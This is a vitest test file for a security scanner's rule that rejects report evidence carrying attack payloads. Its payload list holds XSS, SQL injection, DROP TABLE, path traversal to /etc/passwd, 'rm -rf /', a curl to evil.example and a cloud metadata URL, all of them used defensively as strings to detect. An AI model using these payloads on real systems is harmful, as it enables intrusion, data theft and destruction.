// Safe-output enforcement tests (CYB-43, §8 hard rule).
// The deliverable: "safe-output rule enforced by a test that rejects
// payload-like evidence."

import { describe, it, expect } from 'vitest'
import { isSafeOutput, assertSafeOutput, UnsafeReportError } from '../safe-output'
import { formatReport } from '../formatter'
import type { Finding, ScanResult } from '../types'

const PAYLOADS: ReadonlyArray<string> = [
  "<script>alert(document.cookie)</script>",
  "<img src=x onerror=alert(1)>",
  "' OR '1'='1",
  "1 UNION SELECT username, password FROM users",
  "'; DROP TABLE users;--",
  '../../../../etc/passwd',
  '; rm -rf / ',
  '$(curl http://evil.example/x)',
  'http://169.254.169.254/latest/meta-data/',
]

const SAFE_STRINGS: ReadonlyArray<string> = [
  'Response had no Content-Security-Policy header.',
  'Add "Strict-Transport-Security: max-age=63072000; includeSubDomains".',
  'Negotiated protocol: TLSv1.',
  'SPF record authorizes all senders ("+all").',
  'Certificate expired 3 day(s) ago.',
]

describe('payload detection', () => {
  it('flags every known payload as unsafe', () => {
    for (const p of PAYLOADS) expect(isSafeOutput(p)).toBe(false)
  })
  it('treats legitimate factual evidence/remediation as safe', () => {
    for (const s of SAFE_STRINGS) expect(isSafeOutput(s)).toBe(true)
  })
  it('assertSafeOutput throws UnsafeReportError on payloads', () => {
    expect(() => assertSafeOutput([PAYLOADS[0]!])).toThrow(UnsafeReportError)
  })
})

function baseResult(findings: Finding[]): ScanResult {
  return {
    target: 'example.com',
    tier: 'passive',
    status: 'complete',
    completedAt: '2026-07-01T12:00:00.000Z',
    grade: 'C',
    score: 70,
    categories: [{ key: 'headers', grade: 'C', weight: 1, score: 70 }],
    findings,
  // engineVersion is required by the schema but formatter doesn't read it.
    engineVersion: 'test',
  }
}

describe('formatReport enforces safe output (§8)', () => {
  it('rejects a report whose finding evidence carries a payload (fails closed)', () => {
    const poisoned: Finding = {
      id: 'headers.csp.missing',
      severity: 'high',
      title: 'No Content-Security-Policy header',
      explanation: 'Missing CSP.',
      remediation: 'Add a CSP.',
      category: 'headers',
      // A check (or attacker-influenced input) tried to smuggle a PoC into the
      // report. The formatter MUST refuse to emit it.
      evidence: "Reproduce with <script>alert(1)</script>",
    }
    expect(() => formatReport(baseResult([poisoned]))).toThrow(UnsafeReportError)
  })

  it('formats a clean report without throwing and orders by severity', () => {
    const findings: Finding[] = [
      {
        id: 'headers.xcto.missing',
        severity: 'low',
        title: 'No X-Content-Type-Options header',
        explanation: 'e',
        remediation: 'r',
        category: 'headers',
        evidence: 'Response had no X-Content-Type-Options header.',
      },
      {
        id: 'headers.csp.missing',
        severity: 'high',
        title: 'No Content-Security-Policy header',
        explanation: 'e',
        remediation: 'r',
        category: 'headers',
        evidence: 'Response had no Content-Security-Policy header.',
      },
    ]
    const report = formatReport(baseResult(findings))
    expect(report.findings[0]!.severity).toBe('high') // most severe first
    expect(report.findings[1]!.severity).toBe('low')
  })
})
